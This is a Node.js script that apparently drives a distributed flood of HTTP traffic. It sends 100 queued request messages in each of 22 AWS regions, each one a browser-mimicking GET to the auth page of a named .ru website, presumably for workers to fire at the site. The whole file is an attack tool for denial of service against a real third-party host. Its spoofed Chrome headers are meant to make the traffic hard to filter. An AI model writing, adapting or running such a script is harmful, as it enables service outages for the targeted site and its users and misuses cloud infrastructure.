import AWS from 'aws-sdk';
import pMap from 'p-map';
import {times} from 'lodash';

const REGIONS = [
  'us-east-1',
  'us-east-2',
  'us-west-1',
  'us-west-2',
  'af-south-1',
  'ap-east-1',
  'ap-southeast-3',
  'ap-southeast-1',
  'ap-southeast-2',
  'ap-south-1',
  'ap-northeast-3',
  'ap-northeast-2',
  'ap-northeast-1',
  'ca-central-1',
  'eu-central-1',
  'eu-west-1',
  'eu-west-2',
  'eu-west-3',
  'eu-south-1',
  'eu-north-1',
  'me-south-1',
  'sa-east-1',
];

const payload = {
  url: `https://my.crb-dnr.ru/rich/auth`,
  method: 'GET',
  headers: {
    accept:
      'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9,uk;q=0.8,ru;q=0.7',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
  },
};

(async () => {
  await pMap(
    REGIONS,
    async region => {
      const sqs = new AWS.SQS({region});

      await pMap(
        times(100),
        async () => {
          await sqs
            .sendMessage({
              QueueUrl: `https://sqs.${region}.amazonaws.com/${process.env.AWS_ACC_ID}/requests`,
              MessageBody: JSON.stringify(payload),
            })
            .promise();
        },
        {concurrency: 100, stopOnError: false}
      );

      console.log(`${region}: dispatched`);
    },
    {concurrency: 10, stopOnError: false}
  );

  process.exit(0);
})();
